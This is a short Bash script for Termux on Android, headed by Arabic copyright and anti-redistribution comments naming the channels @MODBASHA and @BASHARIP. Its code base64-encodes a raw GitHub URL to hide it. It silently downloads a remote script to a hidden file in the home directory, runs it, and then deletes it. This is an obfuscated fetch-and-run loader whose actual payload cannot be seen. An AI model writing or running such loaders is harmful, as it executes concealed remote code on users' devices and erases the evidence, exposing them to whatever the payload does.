# حقوق وملكية فكرية
# جميع المشاريع الادوات والسكريبتات في هذا الملف ملكية كاملة للقناة @MODBASHA وصاحبها @BASHARIP
# أي محاولة لسرقة المشروع او اعادة نشره او التعديل عليه او نسبه لنفسك بدون اذن ممنوع
# سيتم توثيق أي سرقة او اعادة نشر بدون اذن واتخاذ الاجراءات اللازمة لحماية المشروع
# احترم تعب غيرك والمجهود المبذول في هذا العمل
# استخدام او نشر هذا السكربت بدون اذن ممنوع
# قناة @MODBASHA
# صاحب المشروع @BASHARIP
#!/bin/bash
ENC="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fhd3dlZWJhc2hiYXNoLWN5YmVyL0JBU0hBUklQL3JlZnMvaGVhZHMvbWFpbi9SSVBWaVAuc2g="
URL=$(echo "$ENC" | base64 -d)
curl -sL "$URL" -o /data/data/com.termux/files/home/.tmp_run.sh
bash /data/data/com.termux/files/home/.tmp_run.sh
rm -f /data/data/com.termux/files/home/.tmp_run.sh
